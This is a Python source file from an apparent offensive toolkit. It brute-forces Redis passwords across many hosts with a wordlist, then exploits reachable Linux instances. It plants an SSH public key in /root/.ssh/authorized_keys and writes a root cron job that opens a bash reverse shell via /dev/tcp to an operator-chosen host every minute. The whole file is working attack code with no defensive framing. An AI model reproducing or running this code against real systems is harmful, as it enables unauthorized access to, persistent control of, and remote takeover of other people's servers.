#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : redis_burte.py
@Author : moresuo
@Time : 2026/6/26 17:16
@脚本说明 : redis爆破
"""
import threading

from redis import Redis

from tools.ProgressTools import BurteProgress
from tools.SchedulerTools import run_batch
from tools.WordlistTools import load_lines
from tools.color import console

redis_found_hosts = set()
redis_found_lock = threading.Lock()


#redis爆破
def scan_redis(host="127.0.0.1", port=6379, password="", ssh_pub_key=None, ip=None, listen_port=8888):
    key = (host, port)
    with redis_found_lock:
        if key in redis_found_hosts:
            return
    try:
        redis_cli = Redis(
            host=host,
            port=int(port),
            password=password,
            db=0,
            socket_timeout=3,
            socket_connect_timeout=3
        )
        if redis_cli.ping():
            with redis_found_lock:
                redis_found_hosts.add(key)
            console.print(f"    [success]✔ Redis {host}:{port} → {password}[/success]")
            redis_info = redis_cli.info()
            if ("Linux" not in redis_info.get("os", "") or
                    redis_info.get("redis_mode") != "standalone" or
                    redis_cli.config_get("protected-mode").get("protected-mode") != "no"):
                console.print(f"    [fail]✗ 不满足 Redis 写入利用条件[/fail]")
                redis_cli.close()
                return
            if ssh_pub_key:
                console.print("    [info]→ 尝试公私钥注入[/info]")
                unauthorized_publicKey(redis_cli, ssh_pub_key)
            if ip:
                console.print("    [info]→ 尝试定时任务反弹[/info]")
                unauthorized_reverseShell(redis_cli, ip, listen_port)
        redis_cli.close()
    except:
        pass


#redis公私钥未授权访问
def unauthorized_publicKey(redis_cli, ssh_pub_key):
    redis_cli.config_set("dir", "/root/.ssh")
    redis_cli.config_set("dbfilename", "authorized_keys")
    redis_cli.set("kfc", "\n\n\n\n" + ssh_pub_key + "\n\n\n\n")
    if ssh_pub_key in redis_cli.get("kfc").decode("utf-8") and redis_cli.save():
        console.print("    [success]✔ 公私钥写入成功[/success]")
        redis_cli.close()


#redis反弹shell未授权
def unauthorized_reverseShell(redis_cli, ip, listen_port):
    redis_cli.config_set("dir", "/var/spool/cron")
    redis_cli.config_set("dbfilename", "root")
    reverseCommand = f"*/1 * * * * bash -i >& /dev/tcp/{ip}/{listen_port} 0>&1"
    redis_cli.set("vw50", "\n\n\n\n" + reverseCommand + "\n\n\n\n")
    if reverseCommand in redis_cli.get("vw50").decode("utf-8") and redis_cli.save():
        console.print("    [success]✔ 定时任务反弹成功[/success]")
        redis_cli.close()


#线程池执行任务
def scan_redis_run(hosts, port=6379, password="", ssh_pub_key=None, ip=None, listen_port=8888, threads=500):
    redis_found_hosts.clear()
    hosts_list = list(hosts)
    passwords = load_lines(password)
    tasks_count = len(hosts_list) * len(passwords)
    tasks = ((host, port, passwd, ssh_pub_key, ip, listen_port) for host in hosts_list for passwd in passwords)
    with BurteProgress(tasks_count, "Redis弱口令") as progress:
        run_batch(tasks, scan_redis, threads, on_progress=progress.update)
